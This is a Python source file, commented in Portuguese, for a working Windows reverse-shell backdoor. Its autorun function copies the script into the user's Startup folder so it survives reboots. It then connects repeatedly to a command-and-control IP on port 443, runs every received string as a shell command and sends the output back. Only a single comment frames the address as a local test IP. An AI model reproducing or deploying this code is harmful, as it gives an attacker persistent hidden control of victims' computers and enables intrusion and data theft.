import socket
import subprocess
import threading
import time
import os
import shutil
import sys



CCIP = "192.168.1.100"  # Exemplo: Seu IP na rede local de testes
CCPORT = 443

def autorun():
    """ Essa função tem o objetivo de fazer esse código ser sempre executado
    quando o sistema é ligado """
    try:
        # Pega o caminho do executável atual
        appdata = os.getenv('APPDATA')
        target_dir = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        
        # Nome do arquivo (seja .py ou .exe convertido)
        file_name = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__)
        target_path = os.path.join(target_dir, file_name)

        # Copia apenas se ainda não existir no destino
        if not os.path.exists(target_path):
            shutil.copy(sys.argv[0], target_path)
    except Exception as e:
        pass 

def conn(ip, port):
    """Estabelece a conexão reversa, para que o em"""
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
        return client
    except:
        return None

def cmd_executor(client, data):
    """Executa o comando e devolve o output pelo socket."""
    try:
        proc = subprocess.Popen(
            data, 
            shell=True, 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as e:
        client.send(str(e).encode() + b"\n")

def shell_loop(client):
    """Loop principal de recebimento de comandos."""
    try:
        while True:
            # Recebe dados e limpa espaços/quebras de linha
            data = client.recv(1024).decode().strip()
            
            if not data:
                break
                
            if data == "/:kill":
                client.close()
                sys.exit()
            
            t = threading.Thread(target=cmd_executor, args=(client, data))
            t.start()
            
    except Exception:
        client.close()

if __name__ == "__main__":

    autorun()
    
    while True:
        connection = conn(CCIP, CCPORT)
        if connection:
            shell_loop(connection)
        else:
            time.sleep(10)